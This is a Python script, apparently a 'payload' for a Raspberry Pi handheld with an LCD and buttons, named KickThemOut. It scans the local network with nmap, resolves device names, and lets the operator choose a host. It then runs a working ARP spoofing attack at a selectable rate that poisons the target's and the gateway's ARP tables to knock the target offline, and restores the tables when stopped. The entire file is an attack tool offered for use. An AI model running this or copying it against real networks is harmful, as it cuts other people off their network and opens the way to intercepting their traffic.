#!/usr/bin/env python3
# KTOx Payload: KickThemOut

# --- IMPORTS ---
import sys
import os
import time
import signal
import threading
import logging
from PIL import Image, ImageDraw, ImageFont

# Add KTOx root to path
KTOX_ROOT = '/root/KTOx'
if os.path.isdir(KTOX_ROOT) and KTOX_ROOT not in sys.path:
    sys.path.insert(0, KTOX_ROOT)

# --- CRITICAL HARDWARE IMPORTS ---
# These must be at the top level. If they fail, the payload can't run.
import LCD_Config
import LCD_1in44
import RPi.GPIO as GPIO
import subprocess

# --- APPLICATION-SPECIFIC IMPORTS ---
# These can be in a try-except block to handle missing dependencies gracefully.
try:
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
    from scapy.config import conf
    conf.ipv6_enabled = False
    from scapy.all import ARP, Ether, sendp, srp, get_if_hwaddr
    import nmap
    import netifaces
except ImportError as e:
    # Use the LCD to display a detailed diagnostic error.
    try:
        # Attempt to initialize display for error reporting
        LCD = LCD_1in44.LCD()
        LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        image = Image.new("RGB", (128, 128), "BLACK")
        draw = ImageDraw.Draw(image)
        s_font = ImageFont.load_default()

        # Get diagnostic info
        py_executable = sys.executable
        py_paths = [p for p in sys.path if 'site-packages' in p]

        # Display info on LCD
        draw.text((5, 2), "Import Error", font=s_font, fill="RED")
        draw.text((5, 14), f"Module: {e.name}", font=s_font, fill="WHITE")
        
        draw.text((5, 28), "Python used:", font=s_font, fill="YELLOW")
        draw.text((5, 38), py_executable.replace('/usr/bin/', ''), font=s_font, fill="CYAN")

        draw.text((5, 52), "Search paths:", font=s_font, fill="YELLOW")
        y = 62
        for path in py_paths[:3]: # Show first 3 site-packages paths
            # Shorten path for display
            short_path = path.replace('/usr/lib/', '').replace('/dist-packages', '/d-p')
            draw.text((5, y), short_path, font=s_font, fill="CYAN")
            y += 10

        draw.text((5, 115), "Install deps for this env", font=s_font, fill="WHITE")

        LCD.LCD_ShowImage(image, 0, 0)
        time.sleep(20) # Keep message on screen for a while

    finally:
        # Also log to file as a fallback
        with open("/tmp/kickthemout_payload.log", "a") as f:
            f.write(f"Failed to import libraries: {e}\n")
            f.write(f"Python Executable: {sys.executable}\n")
            f.write(f"Sys Path: {sys.path}\n")
        sys.exit(1)


# --- LOGGING SETUP ---
LOG_FILE = "/tmp/kickthemout_payload.log"
open(LOG_FILE, "w").close() # Clear log on start
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

def log(message):
    logging.info(message)

# --- GLOBAL STATE & CONFIG ---
PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "KEY_PRESS": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
RUNNING = True
DEBOUNCE_DELAY = 0.25
PACKETS_PER_SECOND = 1 # Default value

# --- UI Drawing Helpers ---
font = None
small_font = None

def setup_fonts():
    global font, small_font
    try:
        font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 14)
        small_font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 11)
    except IOError:
        font = ImageFont.load_default()
        small_font = ImageFont.load_default()

def draw_text(draw, text, position, in_font, fill="WHITE"):
    draw.text(position, text, font=in_font, fill=fill)

def draw_centered_text(draw, text, y, in_font, fill="WHITE"):
    bbox = draw.textbbox((0, 0), text, font=in_font)
    text_width = bbox[2] - bbox[0]
    x = (128 - text_width) // 2
    draw.text((x, y), text, font=in_font, fill=fill)

def display_message(draw, image, message_lines):
    draw.rectangle([(0, 0), (128, 128)], fill="BLACK")
    y = 40
    for line in message_lines:
        draw_centered_text(draw, line, y, font, "LIME")
        y += 20
    LCD.LCD_ShowImage(image, 0, 0)

def draw_menu(draw, title, items, selected_index):
    draw.rectangle([(0, 0), (128, 128)], fill="BLACK")
    draw_centered_text(draw, title, 5, font, "CYAN")
    draw.line([(10, 25), (118, 25)], fill="CYAN", width=1)

    max_items_on_screen = 4
    start_index = max(0, selected_index - (max_items_on_screen // 2))

    y = 30
    for i in range(start_index, min(len(items), start_index + max_items_on_screen)):
        item_ip = items[i].get('ip', 'N/A')
        item_name = items[i].get('name', '') or item_ip

        if len(item_name) > 20:
            item_name = item_name[:19] + '…'

        if i == selected_index:
            draw.rectangle([(0, y - 2), (128, y + 22)], fill="BLUE")
            draw_text(draw, item_name, (5, y), small_font, "YELLOW")
            draw_text(draw, item_ip, (5, y + 11), small_font, "YELLOW")
        else:
            draw_text(draw, item_name, (5, y), small_font, "WHITE")
            draw_text(draw, item_ip, (5, y + 11), small_font, "WHITE")
        y += 25

def draw_confirm_screen(draw, target, pps):
    draw.rectangle([(0, 0), (128, 128)], fill="BLACK")
    draw_centered_text(draw, "Confirm Attack", 5, font, "ORANGE")
    draw.line([(10, 25), (118, 25)], fill="ORANGE", width=1)
    
    target_ip = target.get('ip', 'N/A')
    target_name = target.get('name', '') or target_ip

    draw_text(draw, "Target:", (10, 35), font, "WHITE")
    draw_text(draw, target_name, (10, 55), small_font, "YELLOW")
    draw_text(draw, target_ip, (10, 70), small_font, "YELLOW")

    draw_text(draw, "Packets/sec:", (10, 90), font, "WHITE")
    draw_text(draw, str(pps), (100, 90), font, "YELLOW")
    
    draw_centered_text(draw, "OK to start", 115, small_font, "LIME")


# --- KICKTHEMOUT LOGIC ---

class AttackThread(threading.Thread):
    def __init__(self, my_mac, gateway_ip, target_ip, target_mac, packets_per_second, target_name=''):
        super(AttackThread, self).__init__()
        self.my_mac = my_mac
        self.gateway_ip = gateway_ip
        self.target_ip = target_ip
        self.target_name = target_name
        self.target_mac = target_mac
        self.packets_per_second = packets_per_second
        self.stop_event = threading.Event()
        self.daemon = True

    def run(self):
        log(f"Starting attack on {self.target_ip} at {self.packets_per_second} pps")
        sleep_duration = 1.0 / self.packets_per_second
        gateway_mac = get_mac(self.gateway_ip)
        while not self.stop_event.is_set():
            self.send_spoof_packet(self.gateway_ip, self.target_ip, self.target_mac)
            self.send_spoof_packet(self.target_ip, self.gateway_ip, gateway_mac)
            time.sleep(sleep_duration)
        log(f"Attack on {self.target_ip} stopped.")
        # Restore ARP tables
        log("Restoring ARP for target and gateway.")
        if not gateway_mac:
            log("Could not get gateway MAC for ARP restoration.")
            return
        for _ in range(5):
            self.send_restore_packet(self.gateway_ip, self.target_ip, gateway_mac, self.target_mac)
            self.send_restore_packet(self.target_ip, self.gateway_ip, self.target_mac, gateway_mac)
            time.sleep(0.5)

    def send_spoof_packet(self, src_ip, dest_ip, dest_mac):
        if not dest_mac: return
        arp = ARP(op=2, psrc=src_ip, pdst=dest_ip, hwdst=dest_mac)
        ether = Ether(src=self.my_mac, dst=dest_mac)
        packet = ether / arp
        sendp(packet, verbose=False)

    def send_restore_packet(self, src_ip, dest_ip, src_mac, dest_mac):
        if not src_mac or not dest_mac: return
        arp = ARP(op=2, psrc=src_ip, pdst=dest_ip, hwsrc=src_mac, hwdst=dest_mac)
        ether = Ether(src=src_mac, dst=dest_mac)
        packet = ether / arp
        sendp(packet, verbose=False)

    def stop(self):
        self.stop_event.set()

def get_mac(ip):
    try:
        query = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
        ans, _ = srp(query, timeout=2, verbose=0)
        for _, rcv in ans:
            return rcv[Ether].src
    except Exception as e:
        log(f"Could not get MAC for {ip}: {e}")
        return None

def get_network_info():
    try:
        gws = netifaces.gateways()
        default_gw = gws.get('default', {}).get(netifaces.AF_INET)
        if not default_gw:
            log("Could not find default gateway.")
            return None, None, None, None
        
        gateway_ip = default_gw[0]
        interface = default_gw[1]
        my_mac = get_if_hwaddr(interface)
        
        addrs = netifaces.ifaddresses(interface)
        my_ip = addrs[netifaces.AF_INET][0]['addr']
        netmask = addrs[netifaces.AF_INET][0]['netmask']

        cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
        network_range = f"{my_ip}/{cidr}"

        log(f"Gateway: {gateway_ip}, Interface: {interface}, MAC: {my_mac}, Network: {network_range}")
        return gateway_ip, my_mac, network_range, my_ip
    except Exception as e:
        log(f"Error getting network info: {e}")
        return None, None, None, None

# --- UPDATED scan_network() with mDNS & NetBIOS fallbacks ---
def scan_network(draw, image, network_range):
    log(f"Scanning network: {network_range}")
    display_message(draw, image, ["Scanning...", network_range])
    
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=network_range, arguments='-sn -R')
    except nmap.PortScannerError:
        log("Nmap not found. Please install it.")
        return []

    hosts = []

    import socket
    import subprocess

    # mDNS lookup (Avahi)
    def mdns_lookup(ip):
        try:
            result = subprocess.check_output(
                ["avahi-resolve-address", ip],
                stderr=subprocess.DEVNULL
            ).decode().strip()
            parts = result.split("\t")
            if len(parts) >= 2:
                return parts[1]
        except Exception:
            return ""
        return ""

    # NetBIOS lookup (nmblookup)
    def netbios_lookup(ip):
        try:
            result = subprocess.check_output(
                ["nmblookup", "-A", ip],
                stderr=subprocess.DEVNULL
            ).decode()
            # Parse typical nmblookup output lines for name
            for line in result.splitlines():
                # Example: WORKGROUP<00> -         B <ACTIVE>
                if "<00>" in line or "<20>" in line:
                    parts = line.strip().split()
                    if parts:
                        return parts[0]
        except Exception:
            return ""
        return ""

    for host_ip in nm.all_hosts():
        if 'mac' in nm[host_ip]['addresses']:

            # 1) Nmap hostname
            hostname = nm[host_ip].hostname()

            # 2) System DNS
            if not hostname or hostname == host_ip:
                try:
                    fq = socket.getfqdn(host_ip)
                    if fq and fq != host_ip:
                        hostname = fq
                except Exception:
                    pass

            # 3) mDNS (Avahi)
            if not hostname or hostname == host_ip:
                md = mdns_lookup(host_ip)
                if md and md != host_ip:
                    hostname = md

            # 4) NetBIOS (nmblookup)
            if not hostname or hostname == host_ip:
                nb = netbios_lookup(host_ip)
                if nb and nb != host_ip:
                    hostname = nb

            # Final cleanup
            if hostname == host_ip:
                hostname = ""

            hosts.append({
                'ip': host_ip,
                'mac': nm[host_ip]['addresses']['mac'],
                'name': hostname
            })

    log(f"Scan found {len(hosts)} hosts.")
    return hosts

# --- MAIN SCRIPT ---

def cleanup(*_):
    global RUNNING
    if not RUNNING: return
    RUNNING = False
    log("Cleanup called. Exiting.")
    try:
        if LCD:
            image = Image.new("RGB", (128, 128), "BLACK")
            draw = ImageDraw.Draw(image)
            draw_centered_text(draw, "Exiting...", 55, font, "WHITE")
            LCD.LCD_ShowImage(image, 0, 0)
            time.sleep(0.5)
            LCD.LCD_Clear()
        GPIO.cleanup()
        log("GPIO cleaned up.")
    except Exception as e:
        log(f"Exception during cleanup: {e}")

if __name__ == "__main__":
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    # --- State Variables ---
    state = 'init' # init, scanning, menu, confirm_attack, attacking
    last_press_time = 0
    online_hosts = []
    selected_index = 0
    attack_thread = None
    gateway_ip, my_mac, network_range, my_ip = None, None, None, None
    
    try:
        log("Payload started.")
        
        # Hardware Init
        GPIO.setmode(GPIO.BCM)
        for pin in PINS.values():
            GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
        
        LCD = LCD_1in44.LCD()
        LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
        LCD.LCD_Clear()
        
        setup_fonts()

        image = Image.new("RGB", (128, 128), "BLACK")
        draw = ImageDraw.Draw(image)
        
        while RUNNING:
            current_time = time.time()
            
            if state == 'init':
                display_message(draw, image, ["KickThemOut", "Initializing..."])
                gateway_ip, my_mac, network_range, my_ip = get_network_info()
                if not all([gateway_ip, my_mac, network_range]):
                    display_message(draw, image, ["Network Error", "Check logs."])
                    time.sleep(5)
                    RUNNING = False
                    continue
                state = 'scanning'

            elif state == 'scanning':
                hosts = scan_network(draw, image, network_range)
                online_hosts = [h for h in hosts if h['ip'] != my_ip and h['ip'] != gateway_ip]
                if not online_hosts:
                    display_message(draw, image, ["No Targets", "Found."])
                    time.sleep(3)
                    state = 'scanning'
                else:
                    selected_index = 0
                    state = 'menu'

            elif state == 'menu':
                draw_menu(draw, "Select Target", online_hosts, selected_index)
                LCD.LCD_ShowImage(image, 0, 0)

                if (current_time - last_press_time) > DEBOUNCE_DELAY:
                    if GPIO.input(PINS["UP"]) == 0:
                        last_press_time = current_time
                        selected_index = (selected_index - 1) % len(online_hosts)
                    elif GPIO.input(PINS["DOWN"]) == 0:
                        last_press_time = current_time
                        selected_index = (selected_index + 1) % len(online_hosts)
                    elif GPIO.input(PINS["KEY_PRESS"]) == 0:
                        last_press_time = current_time
                        state = 'confirm_attack'
                    elif GPIO.input(PINS["LEFT"]) == 0:
                        last_press_time = current_time
                        state = 'scanning'

            elif state == 'confirm_attack':
                target = online_hosts[selected_index]
                draw_confirm_screen(draw, target, PACKETS_PER_SECOND)
                LCD.LCD_ShowImage(image, 0, 0)

                if (current_time - last_press_time) > DEBOUNCE_DELAY:
                    if GPIO.input(PINS["UP"]) == 0:
                        last_press_time = current_time
                        PACKETS_PER_SECOND = min(300, PACKETS_PER_SECOND + 10)
                    elif GPIO.input(PINS["DOWN"]) == 0:
                        last_press_time = current_time
                        PACKETS_PER_SECOND = max(1, PACKETS_PER_SECOND - 10)
                    elif GPIO.input(PINS["LEFT"]) == 0:
                        last_press_time = current_time
                        state = 'menu'
                    elif GPIO.input(PINS["KEY_PRESS"]) == 0:
                        last_press_time = current_time
                        target = online_hosts[selected_index]
                        attack_thread = AttackThread(my_mac, gateway_ip, target['ip'], target['mac'], PACKETS_PER_SECOND, target_name=target.get('name', ''))
                        attack_thread.start()
                        state = 'attacking'

            elif state == 'attacking':
                target_ip = attack_thread.target_ip
                target_name = attack_thread.target_name or target_ip
                draw.rectangle([(0,0), (128,128)], fill="BLACK")
                draw_centered_text(draw, "ATTACKING", 20, font, "RED")
                draw_centered_text(draw, target_name, 45, small_font, "WHITE")
                draw_centered_text(draw, target_ip, 60, small_font, "WHITE")
                draw_centered_text(draw, f"{attack_thread.packets_per_second} pps", 80, small_font, "WHITE")
                draw_centered_text(draw, "Press LEFT to stop", 100, small_font, "YELLOW")
                LCD.LCD_ShowImage(image, 0, 0)

                if (current_time - last_press_time) > DEBOUNCE_DELAY:
                    if GPIO.input(PINS["LEFT"]) == 0:
                        last_press_time = current_time
                        log("Stop button pressed.")
                        attack_thread.stop()
                        attack_thread.join()
                        attack_thread = None
                        state = 'menu'

            if GPIO.input(PINS["KEY3"]) == 0:
                RUNNING = False
                if attack_thread:
                    attack_thread.stop()
                    attack_thread.join()

            time.sleep(0.1)

    except Exception as e:
        log(f"An unhandled exception occurred: {e}")
        import traceback
        with open(LOG_FILE, "a") as f:
            traceback.print_exc(file=f)
    finally:
        cleanup()
